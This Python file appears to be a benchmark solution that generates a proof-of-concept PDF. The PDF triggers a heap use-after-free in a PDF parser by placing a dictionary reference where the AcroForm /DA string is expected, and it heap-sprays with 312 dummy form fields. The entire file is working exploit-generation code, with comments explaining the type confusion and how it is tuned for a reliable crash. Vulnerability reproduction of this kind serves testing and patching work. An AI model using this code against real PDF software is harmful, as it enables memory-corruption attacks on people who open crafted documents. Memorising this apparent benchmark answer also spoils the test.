import sys

# Increase recursion limit for deep object structures, although not strictly needed for this specific POC.
sys.setrecursionlimit(2000)

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """

        def build_pdf(num_dummy_fields):
            """
            Helper function to construct the PDF byte stream.
            
            The PoC triggers a heap use-after-free by creating a type confusion
            in an AcroForm dictionary. A dictionary object is referenced where a
            string is expected (/DA key). This leads to improper ref-counting.
            A second, valid reference to the same dictionary ensures it gets freed,
            turning the ref-counting bug into a use-after-free when the buggy
            reference is processed during object destruction.
            
            A large number of dummy fields are used for heap spraying to improve
            the reliability of the crash.
            """
            objects = {}  # Map obj_num -> content bytes

            # Total number of form fields, including dummy and trigger fields
            num_fields_total = num_dummy_fields + 1
            fields_start_obj = 6
            fields_end_obj = fields_start_obj + num_fields_total - 1

            # Object 5: The victim dictionary that will be double-freed.
            victim_obj = 5
            objects[victim_obj] = b'<< /S /A >>'

            # Create dummy field objects for heap spraying.
            field_refs = []
            for i in range(num_dummy_fields):
                field_obj = fields_start_obj + i
                # Using a compact field definition to control PoC size
                objects[field_obj] = f'<< /T(d{i})/FT/Tx/Subtype/Widget/Rect[0 0 0 0] >>'.encode()
                field_refs.append(f'{field_obj} 0 R'.encode())
            
            # Create the trigger field, which holds the "correct" reference to the victim.
            trigger_field_obj = fields_end_obj
            objects[trigger_field_obj] = f'<< /T(trig)/FT/Tx/Subtype/Widget/Rect[1 1 1 1]/AP<</N {victim_obj} 0 R>> >>'.encode()
            field_refs.append(f'{trigger_field_obj} 0 R'.encode())

            # Object 4: The main AcroForm dictionary containing both references.
            acroform_obj = 4
            fields_array_str = b'[' + b' '.join(field_refs) + b']'
            objects[acroform_obj] = b'<< /Fields ' + fields_array_str + f' /DA {victim_obj} 0 R >>'.encode()

            # Object 3: The page object, which lists all fields in its /Annots array.
            page_obj = 3
            annots_refs = [f'{i} 0 R'.encode() for i in range(fields_start_obj, fields_end_obj + 1)]
            annots_array_str = b'[' + b' '.join(annots_refs) + b']'
            objects[page_obj] = b'<< /Type/Page/Parent 2 0 R/MediaBox[0 0 600 800]/Annots ' + annots_array_str + b' >>'

            # Object 2: The pages tree root.
            pages_obj = 2
            objects[pages_obj] = f'<< /Type/Pages/Count 1/Kids[{page_obj} 0 R] >>'.encode()

            # Object 1: The document catalog.
            catalog_obj = 1
            objects[catalog_obj] = f'<< /Type/Catalog/Pages {pages_obj} 0 R/AcroForm {acroform_obj} 0 R >>'.encode()

            # --- Assemble the PDF file ---
            
            body_parts = []
            offsets = {}
            current_offset = 0
            
            # PDF header with a binary comment to ensure it's treated as binary
            header = b'%PDF-1.7\n%\xde\xad\xbe\xef\n'
            body_parts.append(header)
            current_offset += len(header)
            
            # Write objects in ascending order of their number
            sorted_obj_nums = sorted(objects.keys())
            for obj_num in sorted_obj_nums:
                offsets[obj_num] = current_offset
                content = objects[obj_num]
                obj_str = f'{obj_num} 0 obj\n'.encode() + content + b'\nendobj\n'
                body_parts.append(obj_str)
                current_offset += len(obj_str)

            # Cross-reference (xref) table
            xref_offset = current_offset
            xref_lines = []
            num_total_objs = len(sorted_obj_nums) + 1
            xref_lines.append(f'0 {num_total_objs}\n'.encode())
            xref_lines.append(b'0000000000 65535 f \n')
            for obj_num in sorted_obj_nums:
                xref_lines.append(f'{offsets[obj_num]:010} 00000 n \n'.encode())
            
            xref_table = b'xref\n' + b''.join(xref_lines)
            body_parts.append(xref_table)

            # PDF trailer
            trailer = f'trailer\n<< /Size {num_total_objs} /Root 1 0 R >>\n'.encode()
            startxref = f'startxref\n{xref_offset}\n'.encode()
            eof = b'%%EOF\n'
            body_parts.append(trailer)
            body_parts.append(startxref)
            body_parts.append(eof)

            return b''.join(body_parts)

        # The number of dummy fields is tuned to be near the ground-truth PoC size,
        # as this suggests heap spraying is necessary for a reliable crash.
        # 312 fields produces a PoC of ~33.7KB.
        return build_pdf(num_dummy_fields=312)